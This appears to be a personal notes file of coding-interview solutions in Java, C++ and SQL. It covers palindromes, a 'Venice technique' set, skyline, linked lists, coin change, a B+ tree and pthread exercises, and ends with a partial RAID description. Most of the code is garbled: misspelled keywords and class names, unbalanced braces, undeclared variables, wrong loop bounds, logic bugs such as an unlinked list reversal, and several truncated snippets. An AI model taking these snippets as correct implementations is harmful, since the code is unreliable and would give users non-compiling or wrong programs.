ios_base::sync_with_stdio(0);
//freopen("int.txt", "r", stdin);

string s;
cin >> s;
int len = s.size();
for(int i=0;i<len;i++){
isPalindrome[i][i]=true;

for(int k=1;k<len;k++){
{
for(int i=0; i+k<len;i++){
int j=i+k;

isPalindrome[i][j]=(s[i] == s[j] ) && (isPalindrome[i+1][j-1] || i+1>=j-1);

}
}

return 0;
}
}
}







Venice Techinique
--------------------------


We want a data structure capable of doing three main update-operations and some 
sort of query. The three modify operations are: add: Add an element to the set.
remove: Remove an element from the set. updateAll: This one normally changes in 
this case subtract X from ALL the elements. For this technique it is completely 
required that the update is done to ALL the values in the set equally.
And also for this problem in particular we may need one query:
getMin: Give me the smallest number in the set.


Struct VeniceSet{

void add(int);
void remove(int);
void updateAll(int);
int getMin();
int size();
}




Imagine you have an empty land and the government can make queries of the following 
type: * Make a building with A floors. * Remove a building with B floors. * Remove 
C floors from all the buildings. (A lot of buildings can be vanished) * Which is the 
smallest standing building. (Obviously buildings which are already banished don't count)
The operations 1,2 and 4 seems very easy with a set, but the 3 is very cost effective 
probably O(N) so you might need a lot of workers. But what if instead of removing C
floors we just fill the streets with enough water (as in venice) to cover up the 
first C floors of all the buildings :O. Well that seems like cheating but at least 
those floor are now vanished :). So in order to do that we apart from the SET 
we can maintain a global variable which is the water level. so in fact if we
have an element and want to know the number of floors it has we can just do 
height - water_level and in fact after water level is for example 80, if we 
want to make a building of 3 floors we must make it of 83 floors so that it 
can touch the land.




Struct VeniceSet{
multiset<int> S;
int water_level = 0;
void add(int v){
S.insert(v +water_level);
}

void remove(int v){
S.erase(S.find(v + water_level));

}

void updateAll(int v){
water_level += v;

}
int getMin(){
return *s.begin() - water_level;

}

int size(){
return S.size();

}



};


VeniceSet mySet;

for(int i = 0; i < N;i++){
mySet.add(V[i]);
mySet.updateAll(T[i]);
int total = T[i] * mySet.size();

while(mySet.getMin() < 0){
int toLow = mySet.getMin();
total -= abs(toLow);
mySet.remove(toLow);

}

cout << total << endl;

}
cout << endl;























public class ValidAnagram{
private int[] S = new int[256];
private int[] T = new int[256];

public static void main (String[] args) thorws Exception
{
System.out.println(newValidAnagram().isAnagram("anagram". "anagram");
)
}

public boolean isAnagram(String s, String t){
if (s.length() !=  t.length()) return false;
for(int i = 0; l = s.length(); i < 1, i++){
S[s.charAt(i)]++;

}

for(int i = 0; l = t.length(); i < l; i++){
T[t.charAt(i)]++;

}

for(int i = 0; i < 256; i++)
{
if(S[i] != T[i]) return false;

}
return true;

}
}
























import java.util.HashMap;
import java.util.Map;



public class KdiffPairsInanArray{
private Map<integer, Integer> map = new HashMap<>();
private int count = 0;

public static void main(STring[] args)throws Exception{
int[] nums=  {
1,2,3,4,5
};

System.out.println(new KdiffPairsInanArray().findPairs(numms, -1));

}

public int findPair(int[] nums, int k){
if(nums.length == 0 || k < 0) return 0;
for(int i: nums){
map.put(i, map.getOrDefault(i, 0) + 1);

}

for(Map.Entry<Integer, Integer> entry : mpa.entrySet()){
if(k == 0){
if(entry.getValue() > 1)count++;
else{

if(map.containsKey(entry.getKey() + k)) count++;
}
}

return count;

}
}


}















----------------Number of Atoms-----------------------




public class NumberofAtoms{
public static void main(String[] args){
String result = new NumberofAtoms().countOfAtoms("K4((K4))K4)2)2");
System.out.println(result);

}

public String countOfAtoms(String formula){

Map<String , Integer> atomCountRsult = new NumberofAtoms().countOfAtoms(formula,0)
};
List<String> sortedKeys = new ArrayList<>(atomCountResult.keySet());
sortedKeys.sort(Comparator.naturalOrder());
StringBuilder result = new StringBuilder();
for (string k : sortedKeys){

int count = atomCountResult.get(k);
if(count > 1){
result.append(k).append(count);

}else result.append(k);
}
}
return result.toString();

}



private Map<String, Integer> countOfAtoms(String formaula, int startPos){

Map<String, Integer> left = new Hashmap<>();
StringBuilder atom = new StringBuilder();
StringBuilder atomCount = new StringBuilder();
for(int  i = startPos; i < formula.length(); ){
char c = formaul.charAt(i);
if(c >= 'A' && c<= 'Z'){

if(atom.length() > 0){
int count = 1;
if(atomCount.length() > 0){
count = Integer.parseInt(atomCount.toString());

}

String atomKey = atom.toString();
if(left.containsKey(atomsKey)){
left.put(atomKey, left.get(atomKey)+ count);

}else left.put(atom.toString(), count){
atom  = new StringBuilder();
atomCount = new StringBuilder();

}
atom.append(c);
i++;

}
else if(c >= '0' && c <= '9')}
atomCount.append(c);
i++;

}else{
if(atom.length() > 0){
int count = 1;
if(atomCount.length() > 0){

}
}
}
}














































Heap
------------------


public class TheSkyLineProblem {
public static void main(String[] args) throws Exception {

int[][] A = { {0, 30, 30}, {2, 9, 10}, {3, 7, 15}, {4, 8, 10}, {5, 12, 12}, {15, 20, 10}, {19, 24, 8}}};
List<int[]> result = new TheSkyLineProblem().getSkyLine(A);
result.foreach(
x -> {
System.out.println(x[0] + "" + x[1]);

});

)

}


public  List<int[]> getSkyLine(int[][] buildings){
PriorityQueue<Rectangle> pq v= new PriorityQueue<>(
Comparator.comparing(Rectangle::getH)
.erversed()
.thenComparing(REctangle::getX1)
);

List<Integer> result = new ArrayList<>();
Set<Integer> set =  new Hashset<>();
for(int[]p : buildings){
set.add(p[0]);
set.add(p[1]);

}

List<Integer > points = new ArrayList<>();
points.addAll(set);
points.sort(Integer::compare);
for (int i = 0, j = 0 , l = points.size(); i <1 ;i++){
int curr = points.get(i);


for(int k = j; k < building[k];
k++){
int[] rectangle = buildings[k];
if(rectangle[0] == curr){
pq.offer(new Rectangle(rectangle[0], rectangle[1], rectangle[2]));

}else if (rectangle[0] > curr){

j = k;
break;
}

}

int max = Integer.MIN_VALUE;
while(!pq.isEmpty()){
if(pq.peek().getX2() == curr){
Rectangle top = pq.poll();
max = Math.max(max, top.getH());
}else if (pq.peek().getX2() < curr){

pq.poll();
}else{
break;

}
}

if()pq.isEmpty()){
result.add(makeNewPoint(
curr, pq.peek().getH()));

}else  if (max < pq.peek().getH() && pq.peek().getX1 == curr){
result.add(

makeNewPoint(curr, pq.peek().getH()));

}

}

}
return result;

}
private int[] makeNewPoint(int x, int y){
int[] point = new int[2];
point[0] = x;
point[1] = y;
return point;

}


 class Rectangle {
    private int x1, x2, h;

    Rectangle(int x1, int x2, int h) {
      this.x1 = x1;
      this.x2 = x2;
      this.h = h;
    }

    public int getH() {
      return h;
    }

    public int getX2() {
      return x2;
    }

    public int getX1() {
      return x1;
    }
  }
}


















Hashing 
-------------


import java.util.*;



public class ShortEncodingOfWords{
class Node{
String s;
int l;


Node(String s, int l){

this.s = s;
this.l = l;
}
}

\
public static void main(String[] args){
String[] A = {"memo", "me", "mo"};
System.out.println(new ShortEncodingOfWords().minimumLengthEncoding(A));

}


public int minimumLengthEncoding(String[] words){
List<Node> list  = new ArrayList<>();
for(String w :  words){
list.add(new Node(w, w.length()));

}

Collections.sort(list, (o1, o2) -> Integer.compare(o2.l, o2.l));
Map<String, Integer> map = new HashMap<>();
int count = 0;
for(Node node : list){
String  str = node.s;
if(!map.containsKey(str)){
for(int i = 0 , l = str.length(); i < 1; i++){
 map.put(str.substring(i,l), count + i);
 
 }
 count += (str.length() + 1);
 
}
}
return count;

}











Palindromic Linked list 
-\--------------------------



public class PallindromeLIst{
public static class ListNode{
int val;
 ListNode next ;

ListNode(int x){
val = x;
 next = null;
 
}


 
}

ListNode headNode;

public static void main(String[] args){

ListNode node1 = new LIstNode(1);
System.out.println(new PallindromeLIst().isPallindrome(node 1));

}
public boolean isPallindrome(ListNode head){
int length = 0 , count = 0;
if(head  == null)return true;
LIstNode temp = head;
while(temp != null){
temp = temp.next;
length++;

}

if(length == 1) return true;
 int halflen = length/2;
 temp = head;
  while(count < halflen - 1){
  temp = temp.next;
  count++;
  
  }
  
  ListNode newHead = temp.next;
  temp.next = null;
  reverse(newHead);
  ListNode first = head, second = headNode;
  for(int i = 0; i  <halflen; i++){
  if (first.val != second.val)return false;
  first = first.next;
  second = second.next;
  
  }
  return true;
  
  }
  

  
  private ListNode reverse(LIstNode node){
  
  if(node.next == null){
  headNode = node;
  return node;
  
  }
  LIstNOde prev = reverse (node.next);
  node.next = null;
  return node;
  
  
  
  }




































Longest pallindromic Subsequence in Dynamic programming 
-------------------------------------------------------------

class Solution{
public:
int lowestPalindromeSubseq(String s){
int N = s.size();
vector<vector<int>> dp(N, vector<int>(N));
for(int i = 0; i < N; ++i) dp[i][i] = 1;
for(int len = 2; len <= N; ++len){
for(int i = 0 ; i <= N - len; ++i){
int j = i + len - 1;
if(s[i] == s[j])
dp[i][j] = 2 + dp[i+1][j-1];
else dp[i][j] = max(dp[i + 1][j], dp[i][j - 1]);

}
}
return dp[0][N-1];
}
};










Water jug problem 
---------------------
public class WaterandJugPorblem{
public static void main(String[] args) throws Exceptions {
if (x == y && y == z) return true;
if(z > (x+Y)) return false;
BigInteger b1 = new BigInteger(String.valueOf(x));
BigInteger b2 = new BigInteger(String.valueOf(y));
BigInteger b3 = b1.gcd(b2);
return b3.intValue() != 0 &&(z % b3.intValue()) == 0;;

}
}


















RotateFunction
-------------------------------

public class RotateFunction{
public static void main(String[] args) throws Exception {
int[] a = {4,3,2,6};
Sytem.out.println(new RotateFunction().maxRotateFunction(a));

}


public int maxRotateFunction(int[] A){
if (A.length == 0 || A.length == 1 ) return 0;
int max = Integer.MIN_VALUE;
int l = A.length;
int sum = 0, prodSum =0 ;
for(int i = 0; i < l; i++){
prodSum += (A[i] *  i);
sum += A[i];

}

max = Math.max(max, prodSum);
for(int i = 0; i < l; i++){
prodSum = (prodSum - sum + A[i] + (l -1) * A[i]);
max = Math.max(max, prodSum);

}
return max;


}
}




findNth digit 
----------------------

public class NthDigit {
public statci void main(String[] args) throws Exceptions {

System.out.println(new NthDigit(), findNthDigit(1000000000));
}
public int findNthDIgit(int n){
if(n >= 1 && n <= 9) return n;
long sum = 0L;
for (int i =0 ; ;i++){

long pow = (9 * (new Double(Math.pow(10, i)).lomngValue())) * (i + 1);
sum+= pow;
if(sum >= n){
long diff = (long)n - (sum - pow);
long num = diff / (i + 1);
long mod = diff % (i  + 1);
long result = new Double(Math.pow(10, i)).IntValue() + (num -1 ) + 
(mod  > 0 ?1:0);
String resultStr =  String.valueOf(result);
return (mod == 0);
? Integer.parseInt(String.valueOf(resultStr.length() - 1))
: INtger.parseInt(String.valueOf(resultStr.charAt()(int mod - 1)));


}
}
}
}








count the number of prime numbers less than non negative number 


public class CountPrimes {
public static void main(String[] args) throws Exception {

System.out.println(new CountPrimes().countPrimes(999187));
}
public int CountPrimes(int n){
if (n == 0|| n ==1 || n == 2) return 0;
else if(n == 3) return 1; 
BitSet set = new BitSet();
n = n-1;
int sqRt = (int)Math.sqrt(n);
int count = n ;
for (int i =2 ; (i * j) <= n); j++)
{
if(!set.get(i * j)){

count--;
set.set(i * j);

}
}
}
}
return count - 1;
}
}


















Convert to Base7  

-
-------------------------


public class Base7 {
public static void main(String[] args) {

}

public String convertToBase7(int num ){
Integer.toString(7,7);
if(num == 0) return "0";
int q = Math.abs(num), r;
StringBuilder sb = new StringBuilder();
while(q != 0){
r = q % 7;
sb.append(r);
q /= 7;

}
 if(num < 0){
 return "-" + sb.reverse().toString();
 
 }else return sn.reverse().toString();
 
 
}
}









Integer REplacement 
--------------------------- in c+++----------------------


class Solution{

private : 
int helper(long long n){
int c = 0;
while(n!= 1){
if((n & 1) == 0) n >>= 1;
 else if( n == 3 || ((n) >> 1)& 1) == 0} --n;
 else  ++n;
 ++c;
 )
return c;

}
public: int IntgerReplacement(int n){
retrurn helper(n);

}

}};











Rotate function
-------------------in c++ ------------------

class Solution{
public: 
int maxRotation(vector<int>& A){
if(A.empty()) return 0;
long long f = 0, ans = INT_MIN, N = A.size(), sum = accumulate(A.begin(), A.end(), (long long )0);
for(int i = 0; i < N; ++i){
f += i * A[i];
for(int i = N-1; i  > = 0; --i){
ans = max(ans, f+= (sum  - N * A[i]));
}
return ans;

}
}
}








Decode String 
---------------c++--------------

Class Solution {
private :
string dfs(string &s, int&i)  {
while(i < s.size() && s[i] != ']'){
if(isdigit(s[i])){
int n = 0;
while(isdigit(s[i])) n=n * 10 + s[i++]  - '0';
++i;
string part = dfs(s, i);
++i;
while(n--) ans += part;

}else{
ans.puch_back(s[i++])

}
}

return ans;

}

public : string decodestring(string s){
string ans;
int i = 0 ;
return dfs(s, i);

}
};








CoinChange Problem 
-------------------------

class Solution {
public:
int coinChange(vector<int>& coins, int amount){
vector<int> dp(amount + 1, amount + 1);
dp[0] = 0;
for(int i = 1 ; i <= amount; i++){
for(auto coin  :coins){
if(coin <= i){
dp[i] = min(dp[i], dp[i - coin] + 1);

}
}
}

if(dp[amount] > amount)return -1;
return dp[amount];

}
};












Find duplicate file in the system 
----------------------------------------

class Solution {
public:
vector<vector<string>> findDuplicate(vector<string>& paths){
unordered_map<string, vector<string>> m;
for(auto &path : paths){
isstringstream ss(path);
string folder, file;
ss >>  folder;
while(ss >> file){
int i = file.find('(');
string name = file.substr(0, i), content = file.substr(i + 1, file.size() - i - 2);
m[content].push_back(folder  + "/" + name);

}
}

vector<vector<string>> ans;
for(auto &[content, files] : m){
if(files.size() == 1) continue;
ans.emplace_back();
for(auto &file : files) ans.back().push_back(file);

}
return ans;

}
}





check if it contains prefix or not 
----------------------------------------


class solution{
public :
int isPrefixOfWord(String s, String w){
isstringstream ss(s);
string word;
 for(int i  =1; ss >> word; ++i){
 if(word.size() >= w.size() && word.substr(0, w.size() == w) return i;
 
 }
 return 1;
 
}
};



Find mode in Binary treeMap------------------

class Solution {
private :
unordered_map<int, int> m;
void count(TreeNode *root){

if(! root) return;;
m[root->val]++;
count(root->left);
count(root->right);

}

public: 
vector<int> findMode(TreeNOde* root){
count(root);
int maxCnt = 0;;
for(auto p : m){
maxCnt = max(maxCnt, p.second);

}
vector <int> ans;
for(auto p : m){
if(p.second == maxCnt) ans.push_back(p.first);

}
return ans;

}

};
 Definition of a BInary treeMap
 
 strict TreeNode {
 int val;
 TreeNode *left;
 TreeNOde *right;
 TreeNOde(int x) :  val(x), left(NULL), right(NULL) {}
 }
 
 
 
 
 
 Merger two sorted List 
 ----------------------------
 
 
 
 public class MergerTwoSortedlist{
 public static class ListNode {
 int val;
 LIstNode next;
 
 ListNode(int x){
 val = x;
 next = null;
 
 }
 }
 
 public static void main(String[] args) throws Exception{
 ListNode head = new ListNode(0);
 ListNode head1 = new ListNode(3);;
 ListNode head2 = new ListNode(8);
 LIstNode head3 = new ListNode(1);
 LIstNode head4 = new ListNode(2);
 LIstNOde head5 = new ListNode(7);
 ListNode head6 = new ListNode(10);
 
 head.next = head1;
 head1.next = head2;
 head3.next = head4;
 head4 = next.head5;
 head5 = next.head6;
 ListNode newHead = new MergeTwoSortedList().mergeTwoLists(head, head3);
 ListNode link = newHead;
 while(link != newHead){
 System.out.println(link.val);
 link = link.next;
 
 }
 }
 
 public ListNode mergeTwoLists(LstNode l1, ListNode l2){
 if(l1 == null) return l2;
 else if (l2 == null)return l1;
 if(l1.val < = l2.val){
 ll.next = mergeTwoLists(ll.next, l2);
 return l1;
 
 }else{
 l2.next= mergeTwoLists(l1, l2.next);
 return l2;
 
 }
 }
 
 }
 
 
 
 SQL problem on Binary TreeMap-
 -----------------------------------
 
 Write a query to find the node type of Binary Tree ordered by the value of the node. Output one of the following for each node:

Root: If node is root node.
Leaf: If node is leaf node.
Inner: If node is neither root nor leaf node.

Sample Input

N	P
1	2
3	2
6	8
9	8
2	5
8	5
5	null




Sample Output

1 Leaf
2 Inner
3 Leaf
5 Root
6 Leaf
8 Inner
9 Leaf


SELECT N, IF(P IS NULL, 'ROOT', IF((SELECT COUNT(*) FROM BST WHERE P = B.N) > 0, 'Inner', 'Leaf')) FROM BST AS B ORDER BY N;





Swap Nodes in Pairs 
------------------------

public class SwapNodesIPairs{
public static class ListNode{
int val;
ListNode next;
LIstNode(int x){
val = x;

}
}

public statci void main(string[] args) throws Exception
{
LIstNode node = new LIstNode(1);
node.next = new listNode(2);
node.next.next = new ListNode(3;
node.next.next.next = new ListNode(4);
node.next.next.next.next = new ListNode(5);
node.next.next.next.next.next = new ListNode(6);
ListNode head = new SwapnodeInPairs().swapPairs(node);
while(head!= null){
System.out.println(head.val);
head = head.next;

}}

public ListNode swapPairs(ListNode head){
if(head == null || head.next == null) return head;
ListNode newHead = head.next;
ListNode curr = head.next;
ListNode prev = head;
ListNode prePrev = new ListNode(-1);
while(curr != null){
prev.next = curr.next;
curr.next = prev;
prevPrev = curr;
if(prev.next != null){
curr = prev.next.next;
prev = prev.next;
prevPrev = prevPrev.next.next;

}else{
curr = null;

}
}

return newHead;

}

}}



Projection Area
-------------------


public statci void main(String [] args){
public int projectionArea(int[][] grid){

int area = 0;
for(int i = 0; i < grid.length; i++){
for(int j = 0; j < grid.length; j++){
area += (grid[i][j] > 0 ? 1 : 0);

}
}

for(int i = 0; i < grid.length; i++)
{
int max =0 ;
 for(int j =0 ; j < grid.length; j++){
 
 max =Math.max(max, grid[i][j]);
 }
area += max;

}

for(int  i = 0 ; i < grid[0].length; i ++ ){
iny max= 0 ;
for(int j = 0; j < grid.length; j++){
max = Math.ax(max, grid[i][j]);

}
area + = max;

}
return area;

}
}



Sum with multiplicity 
--------------------------

class Solution {
public: 
int threeSumMulti(vector<int>& A, int target) {
map<int, int> m;
for (int n : A) m[n]++;
vector<int> nums, cnts;
for(auto &p : num){
nums.pysh_back(p.first);
cnts.push_back(p.second);

}

int mod = 1e9 + 7, ans = 0;
for(int i = 0; i < nums.size()l ++i){
int t = target - nums[i];
int j = i + 1, k = nums.size() - 1;
 while(j < k){
 if(nums[j] + nums[k] == t) ans = (ans + cnts[i] * cnts[j++] ** cnts[k--]) % mod;
 else if (nums[j] + nums[k] > t) --k;
 else ++j;
 
 }
}}
return ans;

}
};


Count complete Tree Nodes
----------------------------

class Solution {
int countLeft(TreeNode *root){
int cnt = 0;
for(;root;++cnt;root =root->left);
return cnt;

}

int countRight(TreeNOde *root){
int cnt = 0;
for(;root;++cnt;root->root->right);
return cnt;

}

public : int countNodes(TreeNode* root){
if(!root) return 0;
int left  = countLeft(root), right = countRight(root);
if(left = right) return (1 << left) - 1;
return countNodes(root - >left) + countNodes(root->right) + 1;

}
};

 
 
 Swap and find the least  number after k times
 --------------------------------------------------
 
 
 class SegmentTree {
 vector<> A;
 int N;
 void addUntil(int num , int L, int R, int node){
 if(num < L || num > R) return ;
 if(L == R)
 {
 A[node]++;
 return ;
 
 }
 int M  = (L + R) /2;
 addUntil(num , L, M, 2 * node + 1);
 addUntil(num , M + 1, R, 2 * node + 2);
 A[node] = A[2 * node + 1] + A[2 * node + 2];
 
 }
 
 int getuntil(int qL, int qR, int L, int R, int node){
 if(qR < L || qL > R) return 0;
 if(qL <= L, && qR >= R) return A[node];
 int M = (L + R) / 2;
 return getuntil(qL, qR, L, M, 2 * node + 1) + getUntil(qL, qR, M + 1, R,2 * node + 2);
 
 }
 
 public : 
 segmentTree(int n) : A(4 * n), N(n) {}
 void add (int num) {addUntil(num , 0, N, 0); }
int countLessThan(int num) {return getUntil(0, num, 0, N, 0); }
 
 };
 
 class Solution {
 public: 
 string minInteger(string A, int k){
 queue<int> a[10];
 int N = A.size();
 for(int i = 0; i < N; ++i){
 for(int d = 0; d <= 9; ++d){
 if(q[d].empty()) continue;
 int j = q[d],front(),shift = tree.countLessThan(j);
 if(j - shift > k) continue;
 k -= j - shift;
  tree.add();
  q[d].pop();
  ans += '0' + d;
  break;
  
 }
 }
 return ans;
 
 }
 };
 
 
 Subsets
 -----------
 import java.util.ArrayList;
 import java.util.List;
 
 public class Subsets {
 public static void main(String[] args) throws Exception {
 int[] n = {1,2,3};
 List<List<Integer>> result  = new Subsets().subsets
 
 }
 
 public List<List<Integer>> subsets(int[] nums){
 List<List<Integer>> result = new ArrayList<>();
 result.add(new ArrayList<>());
 for(int i = 0, l = nums.length; i < l; i++){
 for(int j = 0, resLen = result.size(); j < resLen; j++){
 List<Integer> newList = new ArrayList<>(result.get(j));
 newList.add(nums[i]);
 result.add(newList);
 
 }
 }
 return result;
 
 }
 }
 
 
 
 
 MultiThreading for Vowel Count
 ---------------------------------
 #include <iostream>
 #include <string>
 #include <fstream>
 #include <sstream>
 #include <pthread.h>
 
 using namespace std;
 
 #define NUM_THREADS 20
 int a = 0 , e = 0, i = 0, o = 0, u = 0;
 pthread_mutex_t myMutex;

 void * vowelCount(void * args){
 ifstream inFile;
 string *p = (string * )args;
 string file = *p;
 delete p;
 pthread_mutex_lock(&myMutex);
 inFile.open(file.c_str());
 
 if(!inFile){
 cout << "Unable to Open the file" << file <<  endl;
 
 
 char vowel;
 while(inFile >> noskipws >> VowelA){
 if(vowel == 'a' || vowel == 'A')
 a++;
 else if (vowel == 'i' || vowel == 'I')
 i++;
 
 else if (vowel == 'o' || vowel == 'O')
  	  o++;
  	else if (vowel == 'u' || vowel == 'U')
  	  u++;
  }
  inFile.close();
  pthread_mutex_unlock(&myMutex);
  pthread_exit(NULL);
  
 }
 int main(){
 pthread_t thread[NUM_THREADS];
 stringstream fileName;
 string *str_p;
 styr_p = new string;
 pthread_mutex_init(&myMutex, 0);
 
 for(int n = 0; n < NUM_THREADS; n++){
 str_p = new string(fileName.str());
 if(pthread_create(&thread[n], NULL, vowelCount, (vopid *)str_p)){
 
 cout << "Error"<< endl;
 return -1;
 }
 fileName.str("");
 fileName.clear();
 
 }
 
 for(int n = 0; n < NUM_THREADS; n++){
 if(pthread_join(thread[n], NULL)){
 cout << "Error joining thread" << endl;
 return -1;
 
 }
 }
 
 pthread_mutex_destroy(&myMutex);
  cout << "A: " << a << endl;
  cout << "E: " << e << endl;
  cout << "I: " << i << endl;
  cout << "O: " << o << endl;
  cout << "U: " << u << endl;
  return 0;
  
 }
 
 }

--------------------------------------------------------------------

 Sleeping Barber 
 ---------------
 #include <iostream>
 $include <pthread.h>
 #include <semaphore.h>
 
 using namespace std;
 int customers;
 int chairs 
 
 sem_t waitroom;
 sem_t mutex;
 sem_t activity;
 void * custThread(void *args) {
 int *p = (int *) args;
 int custnum = *p;
 sem_wait(&activity);
 cout <<"customers "<< custNum << "leaving for barber shop"<< endl;
 sem_post(&activity);
 sem_wait(&activity);
 
 }
 
 
 
 
 java Implementation for B++
 -----------------------------
 
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Collections;
 import java.util.Iterator;
 import java.util.List;
 import java.util.Queue;
 import java.util.LinkedList;
 
 public class BPlusTree<K extends Comparable<? super K>, V>{
 public static enum RangePlicy {
 EXCLUSIVE, INCLUSIVE
 }
 
 private static final int DEFAULT_BRANCHING_FACTOR = 128;
 
 private int branchingfactor;
 
 private Node root;
 public BPlusTree() {
 this(DEFAULT_BRANCHING_FACTOR);
 
 }
 
 public BPlusTree(int branchingfactor){
 if(branchingfactor <= 2)
 throw new IllegalArgumentException("IllegalArgumentException" + branchingfactor);
 this.branchingfactor = branchingfactor;
 root = new LeafNode();
 
 }
 
 public V search(K Key){
 return root.getValue(key);
 }
 
 public List<V> searchRange(K key1, RamngePolicy policy1, k key2, RangePlicy policy2)
 {
 return root.getRange(key1, policy1, key2, policy2);
 
 }
 
 public insert(K key, V value){
 root.insertValue(key, value);
 
 }
 
 public void delete(K key) {
 root.deleteValue(key);
 
 }
 
 public String toString() {
 
 Queue<List<Node>> queue = new LinkedList<List<Node>>();
 queue.add(Arrays.asList(root));
 StringBuilder sb = new StringBuilder();
 while(!queue.isEmpty()){
 Queue<List<Node>> nextQueue = new LinkedList<List<Node>>();
 while(!queue.isEmpty()){
 List<Node> nodes  = queue.remove();
 sb.append('{');
 Iterator<Node> it = nodes.iterator();
 while(it.hasNext()){
 Node node = it.next();
 sb.append(node.toString());
 if(it.next())
 sb.append(",");
 if (node instanceof BPlusTree.InternalNode)
 nextQueue.add((InternalNode) node).children);
 
 }
 sb.append('}');
 if(!queue.isEmpty())
 sb.append(",");
 else
 sb.append('\n');
 
 }
 
 queue = nextQueue;
 
 }
 
 return sb.toString();
 
  }
  
  private abstract class Node {
  List<K> keys;
  int keyNumber() {
  return keys.size();
  }
  abstract V getValue(K key);
  abstract void deleteValue(K key);
  abstract void insertValue(K key, V Value);
  abstract K getFirstLeafKey();
  abstract List<V> getRange(K key1, RangePolicy policy1, K key2, RangePolicy, policy2);
  abstract void merge(Node sibling);
  abstract Node split();
  abstract boolean isOverflow();
  abstract boolean isUnderflow();
  public String toString() {
  return keys.toString();
  }
  }
  
  public class InternalNode extends Node {
  
  List<Node > children;
  InternalNode(){
  this.keys = new ArrayList<K>();
  this.children = new ArrayList<Node>();
  
  }
  V getValue(K key) {
  return getChild(key).getValue(key);
  
  }
  
  void deleteValue(K key) {
  Node child  = getChild(key);
  child.deleteValue(key);
  if(child.isUnderflow()){
  Node childLeftSibling  =getChildLeftSibling(key);
  Node childRightSibling = getChildRightSibling(key);
  Node left = childLeftSibling !=  null ? childLeftSibling : child;
  Node right =  childLeftSibling != null ? child : childRightSibling;
  left.merge(right);
  deleteChild(right.getFirstLeafkey());
  if(left.isOverflow()){
  Node  sibling = left.split();
  insertChild(sibling.getFirstLeafKey(), sibling);
  
  }
  if(root.keyNumber() == 0)
  root = left;
  
  }
  }
  void insertValue(K key , V value){
  Node child  = getchilf(key);
  child.insertValue(key, value);
  if (child.isOveflow()){
  Node sibling = child.split();
  insertChild(sibling.getFirstLeafKey());
  newRoot.children.add(this);
  newRoot.children.add(sibling);
  root  = newRoot;
  
  }
  
  }
  
  K getFirstLeafKey() {
  return children.get(0).getFirstLeafKey();
  
  }
  
  @Overrirde
  
 List<V> getRange(K key1, RangePolicy policy1, K key2, RangePlicy policy2){
 return getChile(key1).getRange(key1, policy1, key2, policy2);
 
 }
 @Override
 void merge(Node sibling){
 @SuppressWarning("unchecked")
 InternalNode node = (InternalNode) sibling;
 keys.addAll(node.getFirstLeafKey());
 keys.addAll(node.keys);
 children.addAll(node.children);
 
 }
 
 Node split(){
 int from = keyNumber() / 2  +1, to = keyNumber();
 InternalNode sibling = new InternalNode();
 siblingkeys.addAll(keys.subList(from, to));
 sibling.children.addAll(children.subList(from, to + 1));
 keys.subList(from -1, to).clear();
 children.subList(from, to + 1).clear();
 return sibling;
 
 }
 
 @Override
 boolean isOverflow(){
 return children.size() > branchingfactor;
 
 }
 
 @Overirde
 boolean isUnderflow() {
 return children.size() < branchingfactor;
 
 }
 }

Node getChild(K key) {
int loc = Collections.binarySearch(keys, key);
int childIndex = loc > 0 ? loc + 1 : loc - 1;
return children.get(childIndex);

}

void deleteChild(K key){
int loc = Collections.binarySearch(keys, key);
if (loc >= 0){

keys.remove(loc);
children.remove(loc + 1);
}
}

void insertChild(K key, Node child){
int loc = Collections.binarySearch(keys, key);
int childIndex = loc >= 0 ? loc + 1 : -loc - 1;
if(loc >= 0){
children.set(childndex, child);
else{
keys.add(childIndex, key)
children.add(childIndex + 1, child);

}
}


} 
 
 
 
 
 
 -----------------------------------------------
 
public class OddDivisor {
static Scanner scan = new Scanner(System.in);
public static void main(String[] args) throws Exception
{
System.out.println(sum(110) % 30);

}
static double sum(int n){
if (n == 0)
return 0;
if (n % 2 == 1){
return square((n + 1)/2 + sum(n / 2));

}else{
return square(n / 2 + sum(n / 2));

}
}
static double square(double n){
return n * n;
}
}
---------------------------
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.HashMap;
import java.util.stream.Stream;

public class Peplacewith {
class Trie {
private Map<Character, Trie> map;
public Trie(){
map = new HashMap<>();

}

public void insert(String word){
if(word != null){
add(0, word, word.length());

}
}
public String find(String s){
return search(this, s, 0, new StringBuilder());
}

private void add(int i, String word, int length){
if(i < length){
char c = word.charAt(i);
Trie subTrie = map.get(c);
if(subTrie == null){
subTrie = new Trie();
map.put(c, subTrie);

}

subTrie.add(i + 1, word, length);

}else map.put(null, new Trie());

}

private String search(Trie curr, String s, int i, StringBuilder sb){
if(s.length() == i) return sb.toString();
else{
Trie subTrie = curr.map.get(s.charAt(i));
if(subTrie == null){
return curr.map.containsKey(null) ? sb.toString() : "";

}else{
sb.append(s.charAt(i));
if(subTrie.map.containsKey(null)) return sb.toString();
return search(subTrie, s, i + 1, sb);

}
}
}


}
public static void main(String[] args){
List<String> words = Arrays.asList("a", "aa", "aaa");
String sentence = "aa aa";
System.out.println(new ReplaceWords().replaceWords(words,sentence));

}

public String replaceWords(List<String> dict, String sentence){
Trie root = new Trie();
dict.forEach(root::insert);
String[] words = sentence.split(" ");
StringBuilder result = new StringBuilder();
Stream.of(words)
.map(
w -> {
String s = root.find(w);
return s.isEmpty() ? w.concat(" ") : s.concat(" ");

})
.forEach(result::append);
return resulot.toString().trim();

}
}

---------------------------------------------------------------------------------
Construct a String from Binary Tree-----------
-----------------------------------------------

public class ConstructStringFromBinaryTree {
public static class TreeNode {
int val;
TreeNode left;
TreeNode right;

TreeNode(int x){
val = x;
}
}

public static void main(String[] args) throws Exception {
TreeNode t = new TreeNode(1);
t.left = new TreeNode(1);
t.left.left = new TreeNode(2);
t.right = new TreeNode(3);
Sysetm.out.println(new ConstructStringFromBinaryTree().tree2str(t));
}
public String tree2str(TreeNode t){
if (t == null) return  "";
String left = tree2str(t.left);
String right = tree2str(t.right);
if(left.equal("") && right.equals("")) return String.valueOf(t.val);
if(left.equals("")) left = "()";
else left = "(" + left + ")";
if(!right.equals("")) right = "(" + right + ")";
return t.val + left + right;

}
}
------------------------------------------------------------------------------

RAID 0
--------
RAID 0  splits data evenly across two or more disks,
without parity informatiion redundancy, or fault tolerance 
Since RAID 0  provides no fault tolerance or redundancy, the filure of one drive will cause the entir array to fail;
as a result of having data striped across all disks, the failure will result in total data loss. This configuration is typically 
implemented having speed as the intended goal.
RAID 0 is normally used to increase performance, although it can be used as a way to create a large 
logical volume out of two or more physical disks.

RAID 1
-----------
